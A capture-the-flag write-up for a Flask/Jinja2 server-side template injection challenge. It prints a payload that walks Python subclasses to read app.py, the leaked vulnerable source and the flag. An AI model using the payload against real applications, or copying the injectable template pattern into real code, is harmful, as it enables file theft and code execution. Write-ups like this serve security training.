# ssti1

## What it is

A website made with flask that uses jinja2 for templating.

It takes a name in an input field and displays it.

## Solution

https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/

From a string literal you can get the base class and open a file.

To get the content of ```app.py```:
```py
{{'abc'.__class__.__base__.__subclasses__()[96].__subclasses__()[0].__subclasses__()[0]('app.py').read()}}
```

We get:
```py
b'from flask import Flask, request, render_template_string, config\n\n\napp = Flask(__name__)\n\napp.config["FLAG"] = "BFS{WelC0m3_To_Th1s_F1rSt_PyTh0n_Vuln3rab1l1ty}"\n\n\n@app.route("/")\ndef index():\n    name = request.args.get("username", "guest")\n    template = open("./index.html").read().format(name)\n    return render_template_string(template)\n\n\nif __name__ == "__main__":\n    app.run()\n'
```

After formatting:
```py
from flask import Flask, request, render_template_string, config

app = Flask(__name__)

app.config["FLAG"] = "BFS{WelC0m3_To_Th1s_F1rSt_PyTh0n_Vuln3rab1l1ty}"

@app.route("/")
def index():
	name = request.args.get("username", "guest")
	template = open("./index.html").read().format(name)
	return render_template_string(template)

if __name__ == "__main__":
    app.run()
```

flag: ```BFS{WelC0m3_To_Th1s_F1rSt_PyTh0n_Vuln3rab1l1ty}```
